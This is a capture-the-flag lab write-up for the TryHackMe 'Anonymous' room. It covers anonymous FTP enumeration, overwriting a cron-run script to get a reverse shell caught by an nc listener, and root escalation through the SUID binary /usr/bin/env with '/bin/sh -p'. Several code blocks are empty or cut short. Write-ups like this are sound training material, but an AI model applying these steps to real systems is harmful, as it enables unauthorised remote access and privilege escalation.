# TryHackMe: Anonymous

[Anonymous](https://tryhackme.com/room/anonymous) is a medium rated room on TryHackMe but even after that it took only 2 major steps to get the `root`. The room focuses mainly on enumerating the services running on the machine.

So, let's begin!

## Enumeration

As a part of the initial enumeration regime, we can first try to access the machine's IP in our browser to check if some website is hosted on port 80/443. But turns out that nothing is hosted over there. The second things that we can do is run an `nmap` scan to check the open ports and what services are running over there.

```bash

```

So, it can be seen that 4 ports are open on the machine which are 21, 22, 139 and 445. Also, it can be seen that `anonymous` access is enabled over FTP that too with write access. So, we can check what files can be accessed over there.

```bash

-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

It can be seen that within the directory named `scripts` there are 3 files. We can download all of them and check their content. Also, from the permissions of the files it can be seen that for file `clean.sh` we have all the read, write and execute permissions set.

```bash
ftp> mget *
mget clean.sh? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.

226 Transfer complete.
68 bytes received in 0.08 secs (0.8309 kB/s)
ftp> exit
221 Goodbye.
```

Now that we have downloaded all the files, we can take a look at each one of them.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat clean.sh       
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

It appears that the bash script `clean.sh` is trying to delete files in the `/tmp` directory and print the output of its actions in the another file named as `removed_files.log`.

As we have access to the `removed_files.log` as well, we can check out its content as well.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete

Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete

```

Nothing interesting can be found in this log file. But one thing that can be inferred from the content of this file is that the `clean.sh` script is being run at fixed intervals which is why we can see multiple entries of "nothing to delete" in the log file. Also, we have one more file `to_do.txt`.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat to_do.txt        
I really need to disable the anonymous login...it's really not safe
```

For this file all that we can say is that **"its too late to realize!"**

From all the 3 files, `clean.sh` appears to be most useful for gaining access to the system.

## Initial Foothold

As we have write access to the `clean.sh` bash script and also that we have a downloaded copy of the same script, we can edit the bash script to run a command that would help us gain a reverse shell on the system. After editing the bash script, we can again upload it on the FTP server as we have write access as well (from the `nmap` results).

```bash

> **Note:** Directly `put` the bash script on the server without deleting the copy on the server as it will retain the original permissions of the script else the newly uploaded script would get uploaded with permissions like: `-rw-r--r--` and because of which won't get executed as expected as the `x` would be disabled. Also, as we have logged in as "anonymous" user we can't perform `chmod` to make it executable.

Now, that our modified bash script is uploaded, all we need to do is start a listener on our local machine using the command: `nc -nvlp 4444` and wait for the connection to open up.

After a few seconds, we do get our reverse shell:

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.91.135] from (UNKNOWN) [10.10.115.25] 60948
sh: 0: can't access tty; job control turned off
$ 
```

The issue here is that this is a `dumb` shell and to improve it an interactive shell we can use [python-pty-shells](https://github.com/infodox/python-pty-shells).

Checkout the guide on how to get a fully interactive TTY using using "python-pty-shells" over [here](https://0xnirvana.medium.com/gaining-interactive-reverse-shell-w-python-a4bd490735a8).

Now that we have a fully interactive shell, we can read the user's flag.

```bash
namelessone@anonymous:~$ ls -la

drwxr-xr-x 6 namelessone namelessone 4096 Apr 24 19:33 .

namelessone@anonymous:~$ cat user.txt 	
```

Our next task is to get `root` privileges.

## Privilege Escalation

The first thing that we can look for is the output of `sudo -l` command but as we don't know the password of the current user we can retrieve those results. The next thing that we can look for are the cron jobs.

```bash
namelessone@anonymous:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

But again, over here also we can't find any useful information. We can also take a look at the files on the system that have SUID/SGID bit set.

```bash

From all the se files, first we can look for binaries that can be exploited using [GTFOBins](https://gtfobins.github.io/). And one such binary appears to be `/usr/bin/env`, 

We can go ahead and search for `env` at GTFOBins and run the command provided there to gain a root masam:

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# whoami
root
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# cd /root
# cat root.txt

```

 And there we get the root flag for this machine!

## Some Key Points to Take Away

1. If FTP is open, check if it is writeable also check files for which write permission is allowed.
